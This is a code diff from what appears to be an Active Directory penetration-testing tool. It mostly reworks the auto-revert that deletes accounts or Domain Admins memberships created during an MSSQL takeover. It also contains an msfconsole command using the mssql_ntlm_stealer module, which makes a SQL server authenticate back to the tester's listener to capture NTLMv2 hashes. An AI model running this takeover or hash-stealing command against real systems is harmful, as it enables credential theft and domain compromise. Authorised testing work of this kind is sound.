-            f"[mssql][revert] remote-exec config build failed for {marked}: {exc}"
-        )
-        return False
+def _remove_da_membership_as(
+    shell: MssqlShell,
+    candidate: Any,
+    *,
+    domain: str,
+    pdc_host: str,
+    admin_username: str,
+) -> tuple[bool, str | None]:
+    """Remove ``admin_username`` from Domain Admins as ``candidate``, then re-read."""
+    from adscan_internal.services.native_account_cleanup import (  # noqa: PLC0415
+        remove_group_member_as_candidate,
+    )
 
-    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or None
-
-    async def _run() -> bool:
-        result = await execute_with_fallback(
-            config,
-            f"net user {admin_username} /delete",
-            workspace_type=workspace_type,
-            timeout=60,
-        )
-        combined = f"{result.stdout or ''}\n{result.stderr or ''}".lower()
-        return bool(result.success) and "command completed" in combined
-
-    try:
-        return bool(run_async_sync(_run()))
-    except Exception as exc:  # noqa: BLE001
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        print_info_debug(
-            f"[mssql][revert] remote-exec delete of {marked} on {marked_host} failed: {exc}"
-        )
-        return False
+    return remove_group_member_as_candidate(
+        shell,
+        candidate,
+        domain=domain,
+        group="Domain Admins",
+        member=admin_username,
+        pdc_host=pdc_host,
+    )
 
 
 def _auto_revert_minted_account(
@@ -5315,191 +5273,140 @@ def _auto_revert_minted_account(
 ) -> None:
     """Roll back the post-ex change after the credential pipeline finishes.
 
-    Mode-aware and SAFETY-CRITICAL:
+    Mode-aware and SAFETY-CRITICAL, and every undo goes through the shared
+    revert precedence (client cleanup account, verified privileged credential,
+    then the minted or promoted account itself), each attempt recorded and
+    settled ``reverted_confirmed`` only on a confirming re-read:
 
-      ``mode == "created"`` (a brand-new account was minted):
-        Delete the account using a credential-driven path that does NOT depend
-        on a SQL sysadmin login (a freshly-minted Domain Admin is not mapped to
-        MSSQL ``sysadmin``, so ``xp_cmdshell`` is denied to it):
-
-          * ``scope == "domain"`` (DC path) — PRIMARY: native LDAP delete via
-            the minted DA credential (most reliable on a DC whose command-exec
-            is unstable). FALLBACK: ``net user <u> /delete`` through the native
-            remote-exec cascade with the same DA credential.
-          * ``scope == "local"`` (member server) — the native remote-exec
-            cascade runs ``net user <u> /delete`` with the minted
-            local-admin credential.
+      ``mode == "created"`` (a brand-new account was minted): delete it without
+        relying on a SQL sysadmin login. Domain scope (DC): native LDAP delete,
+        then SAMR on the DC. Local scope (member server): SAMR on the host.
 
       ``mode == "promoted"`` (an already-controlled EXISTING user was added to
-      Domain Admins):
-        NEVER delete the user — it predates ADscan. Instead remove ONLY the
-        Domain Admins membership WE added, and only when ``already_member`` is
-        False. When ``already_member`` is True the user was a Domain Admin
-        before we touched it, so the exact prior state requires doing NOTHING.
+        Domain Admins): NEVER delete the user, it predates ADscan. Remove ONLY
+        the Domain Admins membership ADscan added, and only when
+        ``already_member`` is False. When it is True the user was a Domain Admin
+        before ADscan touched it: ADscan changed nothing, so the record is
+        discarded and nothing is undone.
 
     Loud on failure: a created account must never be left behind silently, and a
-    membership we added must be removed.
+    membership ADscan added must be removed or disclosed.
     """
+    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
+        VERIFY_ACCOUNT_DELETED,
+        VERIFY_GROUP_MEMBERSHIP,
+    )
+    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
+        KIND_CCACHE,
+        KIND_NT_HASH,
+        KIND_PASSWORD,
+        ROLE_CREATOR,
+        RevertCandidate,
+        run_revert_with_precedence,
+    )
+
+    _ = backend  # retained for signature/call-site compatibility; no longer used
     marked = mark_sensitive(admin_username, "user")
     marked_host = mark_sensitive(host, "hostname")
     marked_domain = mark_sensitive(domain, "domain")
+    is_domain_scope = str(scope or "").strip().lower() == "domain"
 
-    # ── Promoted-existing-user path — group-membership removal only ──────────
+    if mode == "promoted" and already_member:
+        print_info(
+            f"Revert: {marked} was already a Domain Admin in {marked_domain} "
+            "before this operation; leaving its membership untouched."
+        )
+        if ledger is not None and change_id:
+            try:
+                ledger.discard_change(change_id)
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+        return
+
     if mode == "promoted":
-        if already_member:
-            # The user was ALREADY a Domain Admin before we touched it. Removing
-            # the membership would corrupt the prior state — do nothing.
-            print_info(
-                f"Revert: {marked} was already a Domain Admin in {marked_domain} "
-                "before this operation — leaving its membership untouched."
-            )
-            if ledger is not None and change_id:
-                try:
-                    ledger.mark_reverted(change_id)
-                except Exception as exc:  # noqa: BLE001
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
-            return
         print_info(
             f"Revert: removing {marked} from Domain Admins in {marked_domain} "
             "(the existing account itself is preserved)..."
         )
-        removed = False
-        try:
-            from adscan_internal.services.exploitation import (  # noqa: PLC0415
-                ExploitationService,
-            )
 
-            result = ExploitationService().acl.remove_group_member(
-                pdc_host=pdc_host or host,
-                domain=domain,
-                username=admin_username,
-                password=admin_password,
-                target_group="Domain Admins",
-                target_username=admin_username,
-                kerberos=str(admin_password or "").lower().endswith(".ccache"),
-                target_domain=domain,
-                timeout=300,
-            )
-            removed = bool(getattr(result, "success", False))
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-        if removed:
-            print_success(
-                f"{marked} removed from Domain Admins — prior state restored."
-            )
-            if ledger is not None and change_id:
-                try:
-                    ledger.mark_reverted(change_id)
-                except Exception as exc:  # noqa: BLE001
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
-            return
-        print_warning(
-            f"Auto-revert could NOT confirm removal of {marked} from Domain Admins "
-            f"in {marked_domain}. Remove it manually — this membership was added "
-            f"by ADscan and must not be left behind."
-        )
-        if ledger is not None and change_id:
-            try:
-                ledger.mark_failed(
-                    change_id,
-                    error="auto-revert Domain Admins removal not confirmed",
-                    manual_cleanup_instructions=(
-                        f'Remove-ADGroupMember -Identity "Domain Admins" '
-                        f"-Members '{admin_username}' -Confirm:$false"
-                    ),
-                )
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
-        return
-
-    # ── Created-account path — credential-driven delete (no MSSQL/xp_cmdshell) ─
-    # A freshly-minted Domain Admin is NOT a SQL sysadmin login, so it cannot
-    # run ``xp_cmdshell`` (the EXECUTE permission is denied). Delete it instead
-    # through its OWN privileged credential: native LDAP on a DC, native
-    # remote-exec on a member server.
-    _ = backend  # retained for signature/call-site compatibility; no longer used
-    print_info(f"Auto-revert: removing the minted account {marked} on {marked_host}...")
-    ok = False
-    is_domain_scope = str(scope or "").strip().lower() == "domain"
-    if is_domain_scope:
-        # PRIMARY on a DC: native LDAP delete (robust even when command-exec is
-        # unstable). FALLBACK: remote-exec ``net user /delete`` with the DA cred.
-        ok = _delete_minted_account_via_ldap(
-            shell,
-            domain=domain,
-            admin_username=admin_username,
-            admin_password=admin_password,
-        )
-        if ok:
-            print_success(
-                f"Minted account {marked} deleted via LDAP — environment left clean."
-            )
-        else:
-            print_warning(
-                f"LDAP delete of {marked} on {marked_domain} was not confirmed; "
-                "attempting remote-exec 'net user /delete' as a fallback..."
-            )
-            ok = _delete_minted_account_via_remote_exec(
+        def _attempt(candidate: Any) -> tuple[bool, str | None]:
+            return _remove_da_membership_as(
                 shell,
+                candidate,
+                domain=domain,
+                pdc_host=pdc_host or host,
+                admin_username=admin_username,
+            )
+
+        verification = VERIFY_GROUP_MEMBERSHIP
+        manual = (
+            'Remove-ADGroupMember -Identity "Domain Admins" '
+            f"-Members '{admin_username}' -Confirm:$false"
+        )
+        description = "Domain Admins membership removal"
+    else:
+        print_info(f"Auto-revert: removing the minted account {marked} on {marked_host}...")
+
+        def _attempt(candidate: Any) -> tuple[bool, str | None]:
+            return _delete_minted_account_as(
+                shell,
+                candidate,
                 domain=domain,
                 host=host,
                 admin_username=admin_username,
-                admin_password=admin_password,
+                scope=scope,
                 kdc_ip=kdc_ip,
             )
-            if ok:
-                print_success(
-                    f"Minted account {marked} deleted via remote-exec — "
-                    "environment left clean."
-                )
-    else:
-        # Member server: local account → remote-exec ``net user /delete`` with
-        # the minted local-admin credential.
-        ok = _delete_minted_account_via_remote_exec(
-            shell,
-            domain=domain,
-            host=host,
-            admin_username=admin_username,
-            admin_password=admin_password,
-            kdc_ip=kdc_ip,
+
+        verification = VERIFY_ACCOUNT_DELETED
+        manual = (
+            f'Remove-ADUser -Identity "{admin_username}" -Confirm:$false'
+            if is_domain_scope
+            else f"Remove-LocalUser -Name '{admin_username}' (on {host})"
         )
-        if ok:
-            print_success(
-                f"Minted account {marked} deleted via remote-exec — "
-                "environment left clean."
-            )
-    if ok:
-        if ledger is not None and change_id:
-            try:
-                ledger.mark_reverted(change_id)
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
+        description = "Minted account deletion"
+
+    minted_is_ticket = _classify_minted_secret_kind(admin_password) == "ccache"
+    result = run_revert_with_precedence(
+        shell,
+        ledger=ledger,
+        change_id=change_id,
+        domain=domain,
+        purpose="mssql_postex_account",
+        revert_and_confirm=_attempt,
+        verification_method=verification,
+        manual_instructions=manual,
+        object_dn=admin_username,
+        creator_username="" if minted_is_ticket else admin_username,
+        creator_secret="" if minted_is_ticket else admin_password,
+        creator_domain=domain,
+        extra_before_creator=(
+            [
+                RevertCandidate(
+                    role=ROLE_CREATOR,
+                    username=admin_username,
+                    domain=domain,
+                    secret=admin_password,
+                    kind=KIND_CCACHE,
+                )
+            ]
+            if minted_is_ticket
+            else []
+        ),
+        supported_kinds=(KIND_PASSWORD, KIND_NT_HASH, KIND_CCACHE),
+        description=description,
+    )
+    if result.confirmed:
+        print_success(
+            f"{description} confirmed for {marked}: the environment is back to its prior state."
+        )
         return
     print_warning(
-        f"Auto-revert could NOT confirm deletion of {marked} on {marked_host}. "
-        f"Remove it manually — this account must not be left in the environment "
+        f"Auto-revert could NOT confirm the {description.lower()} for {marked}. "
+        "It is disclosed in the environment-change ledger for manual cleanup "
         f"(adscan mssql takeover {host} --revert)."
     )
-    if ledger is not None and change_id:
-        try:
-            ledger.mark_failed(
-                change_id,
-                error="auto-revert account deletion not confirmed",
-                manual_cleanup_instructions=(
-                    f'Remove-ADUser -Identity "{admin_username}" -Confirm:$false'
-                    if is_domain_scope
-                    else f"net user {admin_username} /delete on {host}"
-                ),
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-
 
 def _default_minted_identity(
     shell: MssqlShell, *, domain: str, username: str, password: str
@@ -5845,7 +5752,7 @@ def run_mssql_takeover(
         # then run the credential pipeline, then auto-revert. The ledger detail
         # carries the mode + already_member so a crash-recovery sweep picks the
         # same safe revert action.
-        ledger = getattr(shell, "environment_change_ledger", None)
+        ledger = ledger_or_warn(shell)
         change_id = None
         if ledger is not None:
             try:
@@ -6060,13 +5967,23 @@ def run_mssql_steal_ntlmv2(
     marked_username = mark_sensitive(username, "user")
     marked_password = mark_sensitive(password, "password")
     marked_host = mark_sensitive(host, "hostname")
+    # The SQL host connects back to us: advertise the address that reaches it
+    # (declared > egress > route > interface guess), not a startup-interface IP.
+    from adscan_internal.services.listener_ip import (  # noqa: PLC0415
+        resolve_listener_ip,
+    )
+
+    listener_selection = resolve_listener_ip(shell, target=host)
+    if not listener_selection.resolved:
+        print_error(listener_selection.failure_message())
+        return
     command = (
         f"msfconsole -x 'use auxiliary/admin/mssql/mssql_ntlm_stealer;"
         f"set username {marked_username};"
         f"set password {marked_password};"
         f"set RHOSTS {marked_host};"
         f"set USE_WINDOWS_AUTHENT {islocal};"
-        f"set smbproxy {shell.myip};"
+        f"set smbproxy {listener_selection.ip};"
         f"run;exit'"
     )
     print_info(
